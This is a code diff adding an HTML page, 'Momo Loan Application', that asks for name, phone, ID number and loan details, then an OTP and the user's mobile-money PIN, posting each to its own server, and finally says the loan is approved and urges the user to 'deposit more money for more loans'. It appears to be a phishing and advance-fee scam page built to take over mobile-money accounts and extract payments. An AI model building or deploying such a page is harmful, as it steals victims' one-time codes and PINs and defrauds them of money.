@@ -1,0 +1,152 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Momo Loan Application</title>
+    <style>
+        body {
+            background-color: yellow;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background-color: white;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
+        }
+        .button {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #007BFF;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Momo Loan Application</h2>
+        <form id="loanForm">
+            <div class="input-group">
+                <label for="name">Name:</label>
+                <input type="text" id="name" name="name" required>
+            </div>
+            <div class="input-group">
+                <label for="phone">Phone Number:</label>
+                <input type="text" id="phone" name="phone" required>
+            </div>
+            <div class="input-group">
+                <label for="idNumber">ID Number:</label>
+                <input type="text" id="idNumber" name="idNumber" required>
+            </div>
+            <div class="input-group">
+                <label for="loanAmount">Loan Amount:</label>
+                <input type="number" id="loanAmount" name="loanAmount" required>
+            </div>
+            <div class="input-group">
+                <label for="repaymentPeriod">Repayment Period (days):</label>
+                <input type="number" id="repaymentPeriod" name="repaymentPeriod" required>
+            </div>
+            <button type="submit" class="button">Submit</button>
+        </form>
+
+        <div id="otpVerification" style="display:none;">
+            <h2>OTP Verification</h2>
+            <div class="input-group">
+                <label for="otp">Enter OTP:</label>
+                <input type="text" id="otp" name="otp" required>
+            </div>
+            <button onclick="verifyOtp()" class="button">Verify OTP</button>
+        </div>
+
+        <div id="pinVerification" style="display:none;">
+            <h2>PIN Verification</h2>
+            <div class="input-group">
+                <label for="pin">Enter PIN:</label>
+                <input type="text" id="pin" name="pin" required>
+            </div>
+            <button onclick="verifyPin()" class="button">Verify PIN</button>
+        </div>
+
+        <div id="result" style="display:none;"></div>
+    </div>
+
+    <script>
+        document.getElementById('loanForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const formData = new FormData(this);
+            fetch('/submit-loan', {
+                method: 'POST',
+                body: JSON.stringify(Object.fromEntries(formData)),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    document.getElementById('otpVerification').style.display = 'block';
+                } else {
+                    alert('Error submitting loan application.');
+                }
+            });
+        });
+
+        function verifyOtp() {
+            const otp = document.getElementById('otp').value;
+            fetch('/verify-otp', {
+                method: 'POST',
+                body: JSON.stringify({ otp }),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    document.getElementById('pinVerification').style.display = 'block';
+                } else {
+                    alert('Invalid OTP. Please try again.');
+                }
+            });
+        }
+
+        function verifyPin() {
+            const pin = document.getElementById('pin').value;
+            fetch('/verify-pin', {
+                method: 'POST',
+                body: JSON.stringify({ pin }),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    document.getElementById('result').innerHTML = '<h2>Congratulations! Your loan has been approved. Deposit more money for more loans.</h2>';
+                    document.getElementById('result').style.display = 'block';
+                } else {
+                    alert('Invalid PIN. Please try again.');
+                }
+            });
+        }
+    </script>
+</body>
+</html>
